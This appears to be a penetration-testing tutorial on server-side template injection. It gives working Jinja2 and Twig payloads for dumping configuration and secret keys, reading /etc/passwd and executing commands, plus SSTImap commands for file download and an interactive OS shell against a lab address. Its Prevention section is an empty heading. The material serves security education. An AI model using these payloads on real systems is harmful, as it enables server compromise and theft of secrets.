# Server-Side Template Injection (SSTI)
Web applications can utilize templating engines and server-side templates to generate responses such as HTML content dynamically. This generation is often based on user input, enabling the web application to respond to user input dynamically. When an attacker can inject template code, a Server-Side Template Injection vulnerability can occur. SSTI can lead to various security risks, including data leakage and even full server compromise via remote code execution.
Server-side Template Injection (SSTI) occurs when an attacker can inject templating code into a template that is later rendered by the server. If an attacker injects malicious code, the server potentially executes the code during the rendering process, enabling an attacker to take over the server completely.
# Identifying SSTI
## Confirming SSTI
```
${{<%[%'"}}%\.
```
Since the previous test string should almost certainly violate the template syntax, it should result in an error if the web application is vulnerable to SSTI. 
## Identifying the Template Engine
To enable the successful exploitation of an SSTI vulnerability, we first need to determine the template engine used by the web application. We can utilize slight variations in the behavior of different template engines to achieve this. For instance, consider the following commonly used overview containing slight differences in popular template engines:
We will start by injecting the payload `${7*7}` and follow the diagram from left to right, depending on the result of the injection. Suppose the injection resulted in a successful execution of the injected payload. In that case, we follow the green arrow; otherwise, we follow the red arrow until we arrive at a resulting template engine.
# Exploiting SSTI - Jinja2
In this section, we will assume that we have successfully identified that the web application uses the Jinja template engine. We will only focus on the SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step.
## Information Disclosure
We can exploit the SSTI vulnerability to obtain internal information about the web application, including configuration details and the web application's source code. For instance, we can obtain the web application's configuration using the following SSTI payload:
```
{{ config.items() }}
```
Since this payload dumps the entire web application configuration, including any used secret keys, we can prepare further attacks using the obtained information.
We can use the following SSTI payload to dump all available built-in functions:
```
{{ self.__init__.__globals__.__builtins__ }}
```
## Local File Inclusion (LFI)
We can use Python's built-in function open to include a local file. However, we cannot call the function directly; we need to call it from the __builtins__ dictionary we dumped earlier. This results in the following payload to include the file /etc/passwd:
```
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```
## Remote Code Execution (RCE)
To achieve remote code execution in Python, we can use functions provided by the os library, such as system or popen. However, if the web application has not already imported this library, we must first import it by calling the built-in function import. This results in the following SSTI payload:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
# Exploiting SSTI - Twig
Like in the previous section, we will only focus on the SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step. Twig is a template engine for the PHP programming language.
## Information Disclosure
In Twig, we can use the `_self` keyword to obtain a little information about the current template:
```
{{ _self }}
```
## Local File Inclusion (LFI)
Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework Symfony defines additional Twig filters. One of these filters is file_excerpt and can be used to read local files
```
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```
Remote Code Execution (RCE)
To achieve remote code execution, we can use a PHP built-in function such as system. We can pass an argument to this function by using Twig's filter function, resulting in any of the following SSTI payloads:
```
{{ ['id'] | filter('system') }}
```
## Tools of the Trade
we will use the more modern SSTImap to aid the SSTI exploitation process
To automatically identify any SSTI vulnerabilities as well as the template engine used by the web application, we need to provide SSTImap with the target URL:
```
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```
As we can see, SSTImap confirms the SSTI vulnerability and successfully identifies the Twig template engine. It also provides capabilities we can use during exploitation. 
For instance, we can download a remote file to our local machine using the -D flag:
```
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```
Additionally, we can execute a system command using the -S flag:
```
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```
Alternatively, we can use --os-shell to obtain an interactive shell:
```
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```
```
https://github.com/vladko312/SSTImap
```
# Prevention